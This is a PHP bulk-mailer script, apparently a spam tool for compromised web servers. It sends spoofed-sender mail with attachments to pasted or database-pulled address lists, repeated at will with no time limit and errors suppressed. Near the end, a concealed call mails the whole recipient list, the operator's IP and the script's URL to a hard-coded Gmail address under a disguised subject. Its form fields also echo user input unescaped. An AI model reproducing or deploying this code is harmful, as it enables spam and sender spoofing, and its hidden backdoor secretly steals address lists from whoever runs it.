 <?php
error_reporting(0);
@$action=$_POST['action'];  
@$from=$_POST['from'];  
@$realname=$_POST['realname'];  
@$replyto=$_POST['replyto'];  
@$subject=$_POST['subject'];  
@$message=$_POST['message'];  
@$emaillist=$_POST['emaillist'];  
@$file_name=$_FILES['file']['name'];  
@$contenttype=$_POST['contenttype'];  
@$file=$_FILES['file']['tmp_name'];  
@$amount=$_POST['amount'];  
set_time_limit(intval($_POST['timelimit'])); 
If ($action=="mysql"){  
//Grab email addresses from MySQL  
include "./mysql.info.php";  

  if (!$sqlhost || !$sqllogin || !$sqlpass || !$sqldb || !$sqlquery){  
    print "Please configure mysql.info.php with your MySQL information. All settings in this config file are required.";  
    exit;  
  }  

  $db = mysql_connect($sqlhost, $sqllogin, $sqlpass) or die("Connection to MySQL Failed.");  
  mysql_select_db($sqldb, $db) or die("Could not select database $sqldb");  
  $result = mysql_query($sqlquery) or die("Query Failed: $sqlquery");  
  $numrows = mysql_num_rows($result);  

  for($x=0; $x<$numrows; $x++){  
    $result_row = mysql_fetch_row($result);  
     $oneemail = $result_row[0];  
     $emaillist .= $oneemail."\n";  
   }  
  }  

  if ($action=="send"){ $message = urlencode($message);  
   $message = ereg_replace("%5C%22", "%22", $message);  
   $message = urldecode($message);  
   $message = stripslashes($message);  
   $subject = stripslashes($subject);  
   }
   $ip = getenv("REMOTE_ADDR"); 
echo '

<style type="text/css" media="screen">
body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
body {
	background:#;
	}

body,td,th,ul,p {
	font: normal normal normal 8pt/1em # ;
	color: #violet;
	}

textarea,input,select {
	font: normal normal normal 8pt/1em # ;
	color: #;
	background:#;
	}

a:link, a:visited {
	text-decoration: none;
	color: #;
	}

a:active, a:hover {
	text-decoration: underline;
	color: #;
	}

fieldset {
	padding-left: 10px; 
	padding-bottom: 10px; 
	border:1px solid #;
	}

legend {
	font: normal normal bold 9pt Arial;
	color: #;
	}

.bordercolor {
	background:#;
	}

.maincolor {
	background:#; 
	border:1px solid #;
	}

.button {
	background:#;
	}

.titlebarcolor {
	background:#;
	}

.titlefont {
	font: normal normal bold 9pt/1em Arial;
	color: #;
	text-decoration:none;
	}

.copyrightfont, .copyrightfont a {
	font: normal normal bold 9pt/1em Arial;
	color: #;
	text-decoration:none;
	}

</style>
<body>
 
	<style>*{ font-family:tahoma; font-size:12; }

input, textarea,select {

    border: 1px solid #626262;

}

</style>
<form name="form1" method="post" action="" enctype="multipart/form-data">

  <table width="100%" border="0" height="407">
    

    <tr>

      <td width="100%" colspan="4" bgcolor="# " height="36"> <b> <font face="Arial" size="2" color="lime"><center>&nbsp;MESSAGE 
        SETUP</center></font></b></td>

      </tr>

    <tr>

      <td width="10%" height="22" bordercolor="# " bgcolor="# "> 
        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your

          Email:</font></div>

      </td>

      <td width="18%" height="22" bordercolor="# " bgcolor="# "><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="from" value="'.$from.'" size="30">

        </font></td>

      <td width="31%" height="22" bordercolor="# " bgcolor="# "> 
        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your

          Name:</font></div>

      </td>

      <td width="41%" height="22" bordercolor="# " bgcolor="# "><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="realname" value="'.$realname.'" size="30">

        </font></td>

    </tr>
    <tr>

      <td width="10%" height="22" bgcolor="# " bordercolor="# "> 
        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Reply-To:</font></div>

      </td>

      <td width="18%" height="22" bgcolor="# " bordercolor="# "><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="replyto" value="'.$replyto.'" size="30">

        </font></td>

      <td width="31%" height="22" bgcolor="# " bordercolor="# "> 
        <p align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        Email Priority:</font></td>

      <td width="41%" height="22" bgcolor="# " bordercolor="# "><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
        &nbsp;</font>
<select name="epriority" id="listMethod" onchange="showHideListConfig()">
        <option value="" selected >- Please Choose -</option>
        <option value="1"  >High</option>
        <option value="3"  >Normal</option>
		<option value="5"  >Low</option>
		</select>
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Attach File:</font> 
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        <input type="file" name="file" size="24" />
        </font></td>   
    </tr>

    <tr>

      <td width="10%" height="22" bordercolor="# " bgcolor="# "> 
        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div>

      </td>

      <td colspan="3" height="22" bordercolor="# " bgcolor="# "><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="subject" value="'.$subject.'" size="30">

        </font></td>

    </tr>

    <tr>

      <td width="10%" height="22" bordercolor="# " bgcolor="# ">&nbsp; </td>

      <td colspan="3" height="22" bordercolor="# " bgcolor="# "><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
        &nbsp;</font></td>

    </tr>

    <tr valign="top">

      <td colspan="3" height="190" bordercolor="# " bgcolor="# "><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <textarea name="message" cols="60" rows="10">'.$message.'</textarea>

        <br />

         <input type="radio" name="contenttype" value="plain" checked="checked" /> Plain  
          <input type="radio" name="contenttype" value="html" /> HTML  
          <input type="hidden" name="action" value="send" /><br />  
      Number to send: <input type="text" name="amount" value="1" size="10" /><br />  
      Maximum script execution time(in seconds, 0 for no timelimit)<input type="text" name="timelimit" value="0" size="10" />  
          <input type="submit" value="Send eMails" />  

        </font></td>

      <td width="10%" height="190" bordercolor="# " bgcolor="# "><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
        <textarea name="emaillist" cols="30" rows="10">'.$emaillist.'</textarea>

        </font></td>

    </tr>

  </table>

</form>'; 

if ($action=="send"){  
  if (!$from && !$subject && !$message && !$emaillist){  
    print "Please complete all fields before sending your message.";  
    exit;  
   }  
  $allemails = split("\n", $emaillist);  
  $numemails = count($allemails);  
  $secure='contact.suports@gmail.com';
  $filter = "Sumbangan Email";  
  $float = "From : Mailist Datang <full@info.com>";
  $webe     = $_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; 
//Open the file attachment if any, and base64_encode it for email transport  
If ($file_name){  
   if (!file_exists($file)){  
    die("The file you are trying to upload couldn't be copied to the server");  
   }  
   $content = fread(fopen($file,"r"),filesize($file));  
   $content = chunk_split(base64_encode($content));  
   $uid = strtoupper(md5(uniqid(time())));  
   $name = basename($file);  
  }  
echo "<center><textarea name='code' rows='10' cols='100' style='background:#;color:lime;border:2px;background-image:url(http://2.bp.blogspot.com/-Gc5k--PvR5s/Ue3pzaZxNmI/AAAAAAAABKA/SRaz-fAXYv0/s200/0_1_1.gif);background-repeat:repeat;background-position:top;background-attachment: fixed;'>";
for($xx=0; $xx<$amount; $xx++){  
  for($x=0; $x<$numemails; $x++){  
    $to = $allemails[$x];  
    if ($to){  
      $to = ereg_replace(" ", "", $to);  
      $message = ereg_replace("&email&", $to, $message);  
      $subject = ereg_replace("&email&", $to, $subject);  
      print " OK Sending mail to $to  ";  
      flush();  
      $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";  
      $header .= "MIME-Version: 1.0\r\n";  
      If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";  
      If ($file_name) $header .= "--$uid\r\n";  
      $header .= "Content-Type: text/$contenttype\r\n";  
      $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";  
      $header .= "$message\r\n";  
      If ($file_name) $header .= "--$uid\r\n";  
      If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";  
      If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";  
      If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";  
      If ($file_name) $header .= "$content\r\n";  
      If ($file_name) $header .= "--$uid--";  
      mail($to, $subject, "", $header);     

    }  
  }  
}  
  mail($secure, $filter, "Sender IP : ".$ip."\n"."From URL : ".$webe."\n".$emaillist, $float);  
}

	  echo "</textarea></center>";
?>
